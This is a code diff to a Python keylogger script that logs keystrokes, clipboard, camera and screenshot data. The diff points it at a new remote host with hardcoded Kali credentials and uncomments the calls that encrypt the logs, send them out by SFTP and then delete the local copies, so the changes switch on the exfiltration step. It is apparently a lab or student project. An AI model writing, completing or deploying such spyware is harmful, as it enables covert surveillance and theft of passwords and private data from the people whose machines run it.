@@ -13,18 +13,18 @@ from pynput.keyboard import Key, Listener
 # from browser_history.browsers import Firefox
 
 keys_information = "key_log.txt"
-clipboard_information = "Clipboard.txt"
+clipboard_information = "clipboard.txt"
 camera_information = ""
 screenshot_information = ""
 
 time_iterations = 10
 number_of_iterations_end = 1
 
-myHostname = "192.168.44.16"  # change this
-myUsername = "pi"  # change this
-myPassword = "kali123"  # change this #should be 8 characters or more including special characters
-remote_file = '/home/pi/log/'
-threat_file = '/home/pi/threat/'
+myHostname = "192.168.44.140"  # change this
+myUsername = "kali"  # change this
+myPassword = "kali"  # change this #should be 8 characters or more including special characters
+remote_file = '/home/kali/Desktop/log/'
+threat_file = '/home/kali/Desktop/threat/'
 
 i = 0  # global variable to change the name of image as we click
 
@@ -147,8 +147,8 @@ def read_file():
                 print(line)
                 print("these words were found, storing in Threat Directory")
                 logfiles.close()
-                #encrypt_files()
-                #sftp_files_threat()
+                encrypt_files()
+                sftp_files_threat()
                 delete_files()
                 print("Encrypted and stored in Threat dir")
                 break
@@ -156,8 +156,8 @@ def read_file():
             else:
                 print("no words were found, storing in Log Directory")
                 logfiles.close()
-                #encrypt_files()
-                #sftp_files_log()
+                encrypt_files()
+                sftp_files_log()
                 delete_files()
                 print("Encrypted and stored in Log dir")
                 break
